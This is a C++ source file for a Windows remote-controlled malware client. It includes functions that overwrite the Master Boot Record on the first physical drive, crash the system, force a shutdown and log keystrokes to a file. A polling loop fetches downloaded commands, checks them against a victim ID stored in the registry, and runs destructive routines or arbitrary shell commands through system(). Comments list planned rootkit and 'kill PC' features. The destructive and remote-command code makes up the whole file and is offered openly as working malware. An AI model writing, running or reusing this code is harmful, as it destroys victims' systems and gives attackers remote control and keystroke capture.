#include <iostream>
#include <algorithm>
#include <vector>
#include <fstream>
#include <windows.h>
#include <string>
#include <cstddef>
#include <sstream>
#include <memory>
#include <cstdio>
#include "download.h"
#include "LCb.h"

std::ofstream logfile("C:\\Bootstrap\\keyslog");

bool isRegistryKeyExists(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH") {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT *p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        char c = static_cast<char>(p->vkCode);
        logfile << c;
        logfile.flush();
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

//mode it been released in 6.0 or when I have time
bool BS; //bsod
bool RMBR; //remove mbr
bool RW; //rewrite
bool CKPC; //can kill pc
bool CURI; //can use remove input
bool IRK; //install root kit
//mode

const std::string Codes[3] = {
    "CodeAlpha","CodeBeta","CodeGamma"
};

int Seed = 953608578; // Generated from Random.org

/**
 * Writes the Master Boot Record (MBR) to the PhysicalDrive0 handle.
 *
 * @return 0 if the MBR was successfully written, -1 otherwise.
 *
 * @throws ErrorType if there is an error while writing the MBR.
 */
int _WriteMBR() { // used from Zer0Mem0ry
    // just open a handle to PhysicalDrive0, and we write our custom bootloader
    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, LCb.data(), 512, &dwBytesWritten, 0); // write the file to the handle
    if (hDevice) {
        return 0;
        CloseHandle(hDevice); // close the handle
    }
    else {
        return -1;
        CloseHandle(hDevice); // close the handle
    }
}

/**
 * Calls the Blue Screen of Death (BSoD) by creating a file with the name "BSoDFile"
 * in the "$MFT" directory.
 *
 * @param None
 *
 * @return None
 *
 * @throws None
 */
void _CallBSoD() {
	HANDLE hFile = NULL;
	hFile = CreateFileW(L"C:\\$MFT\\BSoDFile", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	CloseHandle(hFile);
}

/**
 * CodeAlpha function calls _WriteMBR and _CallBSoD.
 *
 * @param None
 *
 * @return None
 *
 * @throws None
 */
void CodeAlpha() {
    _WriteMBR();
    _CallBSoD();
}

void SetCurrentID(int Id) {
    const wchar_t* REGISTRY_PATH = L"SOFTWARE\\RSEIDPATH";
    const wchar_t* REGISTRY_VALUE_NAME = L"ID";
    HKEY hKey;
    LONG result;

    // Open or create the registry key
    result = RegCreateKeyExW(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        std::cout << "Failed to open or create registry key." << std::endl;
    }

    // Read the ID from the registry
    DWORD id = Id;
    DWORD dataSize = sizeof(DWORD);

    // Save the ID to the registry
    result = RegSetValueExW(hKey, REGISTRY_VALUE_NAME, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&id), sizeof(DWORD));
    if (result != ERROR_SUCCESS) {
        std::cout << "Failed to save ID to the registry." << std::endl;
    }

    // Close the registry key
    RegCloseKey(hKey);
}

int GetRegistryKeyValue(const std::wstring& keyPath = L"SOFTWARE\\RSEIDPATH", const std::wstring& valueName = L"ID") {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        DWORD valueType;
        DWORD dataSize;
        result = RegQueryValueExW(hKey, valueName.c_str(), NULL, &valueType, NULL, &dataSize);
        if (result == ERROR_SUCCESS && valueType == REG_DWORD && dataSize == sizeof(DWORD)) {
            DWORD value;
            result = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value), &dataSize);
            if (result == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return static_cast<int>(value);
            }
        }
        RegCloseKey(hKey);
    }
    return -1; // Возврат значения -1, если чтение значения ключа не удалось
}

/**
 * Reads a configuration file and sets certain flags based on the contents of the file.
 *
 * @throws Error opening the file or reading its contents.
 */
/*
void readConfFile() {
    const char header = '!';
    const char newline = '&';
    const vector<string> names = {
        "BS", "RMBR", "RW", "CKPC", "CURI", "IRK"
    };

    char buffer;
    string Buffer;
    ifstream f("X:\\051DD118572A366E");

    if (f) {
        buffer = f.get();
        if (buffer == header) {
            f.seekg(2);
            for (int i = 0; i < 4; i++) {
                buffer = f.get();
                Buffer += buffer;
                if (buffer != header) {
                    auto it = std::find(names.begin(), names.end(), buffer);

                    if (it != names.end()) {
                        switch (Buffer) {
                            case names[0]:
                                BS = true;
                                break;
                            case names[1]:
                                RMBR = true;
                                break;
                            case names[2]:
                                RW = true;
                                break;
                            case names[3]:
                                CKPC = true;
                                break;
                            case names[4]:
                                CURI = true;
                                break;
                            case names[5]:
                                IRK = true;
                                break;
                        }
                    }
                }
            }
        }
    }
    f.close();
}
*/
/**
 * Reboots the system by executing the "shutdown" command with the specified arguments.
 *
 * @param None
 *
 * @return None
 *
 * @throws None
 */
void _Reboot() {
    system("shutdown -s -f -t 0");
}

/**
 * CodeBeta function.
 *
 * This function is responsible for writing MBR and rebooting.
 * 
 * @throws ErrorType description of error
 */
void CodeBeta() {
    _WriteMBR();
    _Reboot();
}

/**
 * CodeGamma function.
 *
 * This function is responsible for writing MBR.
 * 
 * @throws ErrorType description of error
 */
void CodeGamma() {
    _WriteMBR();
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append(static_cast<char*>(contents), totalSize);
    return totalSize;
}

std::string parseCommand() {
    std::ifstream file(downloadFile());
    std::string output;
    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            output += line;
        }
        file.close();
    }
    return output;
}

void handleCommand(std::string command = parseCommand()) {
    try {
        std::string buffer;
        
        // Check if the registry key exists
        if (!isRegistryKeyExists()) {
            // If the command starts with 's', set the current ID
            if (command[0] == 's') {
                buffer = command.substr(1, 6);
                SetCurrentID(std::stoi(buffer));
            }
        }
        else {
            buffer = command.substr(0, 5);
            
            // If the command does not start with 's', check if the registry key value matches
            if (command[0] != 's') {
                if (buffer == "*****") {

                }
                else if (GetRegistryKeyValue() != std::stoi(buffer)) {
                   return; 
                }
            }
            
            char code = command[5];
            
            // Execute code based on the command code
            switch (code) {
                case 'a':
                    return CodeAlpha();
                case 'b':
                    return CodeBeta();
                case 'g':
                    return CodeGamma();
                case 'c':
                    buffer = command.substr(8, 32767);
                    system(buffer.c_str());
                    break;
            }
        }
    } catch (...) {
        std::cout << "Error" << std::endl;
    }
}

int main() {
    bool isDebbuging = true;
    if (isDebbuging) {
        std::cout << GetRegistryKeyValue() << std::endl;
        std::cout << isRegistryKeyExists() << std::endl;
        std::cout << "NOTE: If the output of console is: stoi then the ID isn't correct!" << std::endl;
    }
    while (true) {
        handleCommand();
    }
}
